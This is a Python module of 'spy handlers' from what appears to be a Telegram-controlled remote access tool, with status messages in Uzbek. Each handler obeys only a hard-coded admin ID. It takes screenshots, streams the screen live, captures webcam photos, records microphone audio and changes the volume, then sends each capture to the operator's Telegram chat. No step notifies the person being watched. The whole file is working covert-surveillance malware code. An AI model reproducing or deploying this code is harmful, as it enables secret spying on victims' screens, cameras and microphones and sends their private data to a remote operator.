# client_handlers/spy.py - v3.0.5 SPY HANDLERS
"""
🕵️ Surveillance Handlers (Non-Blocking)
- Screenshot (async)
- Live stream (async)
- Webcam (async)
- Audio recording (async)
"""

import asyncio
import io
import time
import logging
from typing import Optional

from telethon import events
from telethon.tl.custom import Button

logger = logging.getLogger(__name__)


def register_spy_handlers(client, ctx):
    """Register all spy-related handlers"""
    
    admin_id = ctx.admin_id
    
    # ==================== SCREENSHOT ====================
    @client.on(events.CallbackQuery(data=b"screenshot"))
    async def screenshot_handler(event):
        """Take and send screenshot"""
        if event.sender_id != admin_id:
            return
        
        try:
            await event.answer("📸 Rasm olinmoqda...")
            
            from utils import send_screenshot
            success = await send_screenshot(client, event.chat_id)
            
            if not success:
                await event.answer("❌ Screenshot xatosi", alert=True)
                
        except Exception as e:
            logger.error(f"Screenshot handler error: {e}")
            await event.answer(f"❌ {e}", alert=True)
    
    @client.on(events.CallbackQuery(data=b"broadcast_screenshot"))
    async def broadcast_screenshot_handler(event):
        """Broadcast screenshot to admin"""
        if event.sender_id != admin_id:
            return
        
        await event.answer("📸 Broadcast screenshot...")
        
        from utils import send_screenshot
        await send_screenshot(client, admin_id)
    
    # ==================== LIVE STREAM ====================
    @client.on(events.CallbackQuery(data=b"live_start"))
    async def live_start_handler(event):
        """Start live stream"""
        if event.sender_id != admin_id:
            return
        
        from utils import state, start_live_stream
        
        if state.is_live_active:
            await event.answer("⚠️ Efir allaqachon faol!", alert=True)
            return
        
        await event.answer("🎥 Jonli efir boshlanmoqda...")
        
        # Start in background - non-blocking!
        asyncio.create_task(start_live_stream(client, event.chat_id))
    
    @client.on(events.CallbackQuery(data=b"live_stop"))
    async def live_stop_handler(event):
        """Stop live stream"""
        if event.sender_id != admin_id:
            return
        
        from utils import stop_live_stream
        
        await stop_live_stream()
        await event.answer("⏹ Efir to'xtatildi")
    
    @client.on(events.CallbackQuery(data=b"broadcast_live_start"))
    async def broadcast_live_start_handler(event):
        """Start broadcast live stream"""
        if event.sender_id != admin_id:
            return
        
        from utils import state, start_live_stream
        
        if state.is_live_active:
            await event.answer("⚠️ Efir allaqachon faol!")
            return
        
        await event.answer("🎥 Broadcast efir...")
        asyncio.create_task(start_live_stream(client, admin_id))
    
    @client.on(events.CallbackQuery(data=b"broadcast_live_stop"))
    async def broadcast_live_stop_handler(event):
        """Stop broadcast live stream"""
        if event.sender_id != admin_id:
            return
        
        from utils import stop_live_stream
        await stop_live_stream()
        await event.answer("⏹ Broadcast efir to'xtatildi")
    
    # ==================== WEBCAM ====================
    @client.on(events.CallbackQuery(data=b"webcam_photo"))
    async def webcam_photo_handler(event):
        """Take webcam photo"""
        if event.sender_id != admin_id:
            return
        
        try:
            await event.answer("📷 Kamera rasmi olinmoqda...")
            
            from utils import run_blocking, OPENCV_AVAILABLE
            
            if not OPENCV_AVAILABLE:
                await client.send_message(
                    event.chat_id,
                    "❌ OpenCV mavjud emas. Webcam ishlamaydi."
                )
                return
            
            # Non-blocking webcam capture
            def capture_webcam():
                import cv2
                cap = cv2.VideoCapture(0)
                if not cap.isOpened():
                    return None
                
                ret, frame = cap.read()
                cap.release()
                
                if not ret:
                    return None
                
                # Encode to JPEG
                _, buffer = cv2.imencode('.jpg', frame)
                return buffer.tobytes()
            
            image_bytes = await run_blocking(capture_webcam)
            
            if image_bytes:
                await client.send_file(
                    event.chat_id,
                    io.BytesIO(image_bytes),
                    caption=f"📷 Webcam\n🕐 {time.strftime('%H:%M:%S')}",
                    file_name="webcam.jpg"
                )
            else:
                await client.send_message(
                    event.chat_id,
                    "❌ Kamera topilmadi yoki ishlamayapti"
                )
                
        except Exception as e:
            logger.error(f"Webcam error: {e}")
            await event.answer(f"❌ {e}", alert=True)
    
    @client.on(events.CallbackQuery(data=b"broadcast_webcam"))
    async def broadcast_webcam_handler(event):
        """Broadcast webcam photo"""
        if event.sender_id != admin_id:
            return
        
        # Reuse same logic
        event._chat_id = admin_id
        await webcam_photo_handler(event)
    
    # ==================== AUDIO RECORDING ====================
    @client.on(events.CallbackQuery(data=b"audio_record"))
    async def audio_record_handler(event):
        """Record audio from microphone"""
        if event.sender_id != admin_id:
            return
        
        try:
            await event.answer("🎙 Audio yozilmoqda (10s)...")
            
            from utils import run_blocking, PYAUDIO_AVAILABLE
            
            if not PYAUDIO_AVAILABLE:
                await client.send_message(
                    event.chat_id,
                    "❌ PyAudio mavjud emas. Audio yozish ishlamaydi."
                )
                return
            
            # Non-blocking audio recording
            def record_audio(duration=10, sample_rate=44100):
                import pyaudio
                import wave
                import io
                
                p = pyaudio.PyAudio()
                
                stream = p.open(
                    format=pyaudio.paInt16,
                    channels=1,
                    rate=sample_rate,
                    input=True,
                    frames_per_buffer=1024
                )
                
                frames = []
                for _ in range(0, int(sample_rate / 1024 * duration)):
                    data = stream.read(1024)
                    frames.append(data)
                
                stream.stop_stream()
                stream.close()
                p.terminate()
                
                # Create WAV buffer
                buffer = io.BytesIO()
                wf = wave.open(buffer, 'wb')
                wf.setnchannels(1)
                wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
                wf.setframerate(sample_rate)
                wf.writeframes(b''.join(frames))
                wf.close()
                
                buffer.seek(0)
                return buffer.getvalue()
            
            await client.send_message(event.chat_id, "🎙 Yozilmoqda... (10 soniya)")
            
            audio_bytes = await run_blocking(record_audio, 10)
            
            if audio_bytes:
                await client.send_file(
                    event.chat_id,
                    io.BytesIO(audio_bytes),
                    caption=f"🎙 Audio yozuvi\n🕐 {time.strftime('%H:%M:%S')}",
                    file_name="recording.wav",
                    voice_note=True
                )
            else:
                await client.send_message(event.chat_id, "❌ Audio yozish xatosi")
                
        except Exception as e:
            logger.error(f"Audio record error: {e}")
            await client.send_message(event.chat_id, f"❌ {e}")
    
    @client.on(events.CallbackQuery(data=b"broadcast_audio"))
    async def broadcast_audio_handler(event):
        """Broadcast audio recording"""
        if event.sender_id != admin_id:
            return
        
        event._chat_id = admin_id
        await audio_record_handler(event)
    
    # ==================== VOLUME CONTROL ====================
    @client.on(events.CallbackQuery(data=b"vol_up"))
    async def volume_up_handler(event):
        """Increase volume"""
        if event.sender_id != admin_id:
            return
        
        from utils import volume_up
        await volume_up()
        await event.answer("🔊 Ovoz oshirildi")
    
    @client.on(events.CallbackQuery(data=b"vol_down"))
    async def volume_down_handler(event):
        """Decrease volume"""
        if event.sender_id != admin_id:
            return
        
        from utils import volume_down
        await volume_down()
        await event.answer("🔉 Ovoz kamaytirildi")
    
    @client.on(events.CallbackQuery(data=b"mute"))
    async def mute_handler(event):
        """Mute volume"""
        if event.sender_id != admin_id:
            return
        
        from utils import mute
        await mute()
        await event.answer("🔇 Ovozsizlantirildi")
    
    @client.on(events.CallbackQuery(data=b"unmute"))
    async def unmute_handler(event):
        """Unmute volume"""
        if event.sender_id != admin_id:
            return
        
        from utils import unmute
        await unmute()
        await event.answer("🔊 Ovoz yoqildi")
    
    # Broadcast volume
    @client.on(events.CallbackQuery(data=b"broadcast_vol_up"))
    async def broadcast_vol_up_handler(event):
        if event.sender_id != admin_id:
            return
        from utils import volume_up
        await volume_up()
        await event.answer("🔊 +")
    
    @client.on(events.CallbackQuery(data=b"broadcast_vol_down"))
    async def broadcast_vol_down_handler(event):
        if event.sender_id != admin_id:
            return
        from utils import volume_down
        await volume_down()
        await event.answer("🔉 -")
    
    @client.on(events.CallbackQuery(data=b"broadcast_mute"))
    async def broadcast_mute_handler(event):
        if event.sender_id != admin_id:
            return
        from utils import mute
        await mute()
        await event.answer("🔇 Mute")
    
    @client.on(events.CallbackQuery(data=b"broadcast_unmute"))
    async def broadcast_unmute_handler(event):
        if event.sender_id != admin_id:
            return
        from utils import unmute
        await unmute()
        await event.answer("🔊 Unmute")
    
    logger.info("Spy handlers registered")
